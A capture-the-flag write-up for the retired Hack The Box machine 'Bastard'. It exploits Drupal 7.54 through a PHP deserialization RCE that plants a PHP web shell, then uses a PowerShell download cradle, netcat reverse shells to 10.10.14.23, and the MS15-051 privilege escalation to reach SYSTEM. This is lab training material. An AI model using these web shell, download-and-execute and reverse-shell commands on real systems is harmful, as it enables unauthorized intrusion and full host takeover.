# Bastard

This is the write-up for the box Bastard that got retired at the 16th September 2017.
My IP address was 10.10.14.23 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.9    bastard.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/bastard.nmap 10.10.10.9
```

```markdown
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking HTTP (Port 80)

As the web server is IIS version 7.5 the OS of the box is most likely Windows Sever 2008 R2 server.

On the web page we see a _Drupal_ installation.
One of the default files of Drupal is the _/CHANGELOG.txt_ where we can find out which version this is. The version is 7.54 which was released on  February 1st 2017.

We can look for exploits for this:
```markdown
searchsploit drupal 7
```

The exploit we want to use is called _"Drupal 7.x Module Services - Remote Code Execution"_ which is a **PHP serialization** vulnerability.
We will change some lines in the code to get command execution and file upload and set the variables correctly:
```php
# (...)
$url = 'http://10.10.10.9/';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$phpCode = <<<'EOD'
<?php
if (isset($_REQUEST['upload'])) {
        file_put_contents($_REQUEST['upload'], file_get_contents("http://10.10.14.23:8000/" . $_REQUEST['upload']));
};
if (isset($_REQUEST['exec'])) {
        echo "<pre>" . shell_exec($_REQUEST['exec']) . "</pre>";
};
?>
EOD;

$file = [
    'filename' => 'exploit.php',
    'data' => $phpCode
];
# (...)
```

Run the exploit:
```markdown
php5 drupal_exploit.php
```
```markdown
# Output
#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9//exploit.php
```

Now when we browse to the this page we can test if we have command execution:
```markdown
http://10.10.10.9/exploit.php?exec=whoami
```

It outputs that we are _NT Authority\iusr_.

Now that we either have command execution with this method or we can use the token in the file _session.json_ and replace our cookies with these values and we are logged in as Admin:

![Admin page](https://kyuu-ji.github.io/htb-write-up/bastard/bastard_adminpage.png)

### Command Execution on HTTP

We should can run any enumeration script on this box to get an attack surface. I will run _PowerUP.ps1_ from the **Powersploit Framework** first.

Download the file from your local machine and run it:
```markdown
.../exploit.php?exec=echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23:8000/PowerUp.ps1') | powershell -noprofile -
```

Unfortunately there is no interesting information in this output so lets run another enumeration script. I will run [Sherlock](https://github.com/rasta-mouse/Sherlock) now and get some suggestions for vulnerabilities to exploit.

We want to upload _Netcat for Windows_ on this box and execute it to get a reverse shell:
```markdown
/exploit.php?upload=nc64.exe&exec=nc64.exe -e cmd 10.10.14.23 9001
```

After running this our listener on port 9001 starts and we get a reverse shell.

## Privilege Escalation

The enumeration script suggested us some exploits we can use and I will use **MS15-051 - Win32k LPE vulnerability** also known as _CVE-2015-1701_.
To use this exploit we copy the [Proof-of-Concept script from GitHub](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051) to our local machine and upload and execute it on the box.
```markdown
/exploit.php?upload=ms15-051x64.exe&exec=ms15-051x64.exe whoami
```

This outputs that we are _NT Authority\SYSTEM_ and thus the exploit works and we can start a shell with this.
```markdown
/exploit.php?upload=ms15-051x64.exe&exec=ms15-051x64.exe "nc64.exe -e cmd 10.10.14.23 9002"
```

After running this our listener on port 9002 starts and we get a reverse shell with the user _NT Authority\SYSTEM_ and the box is done!
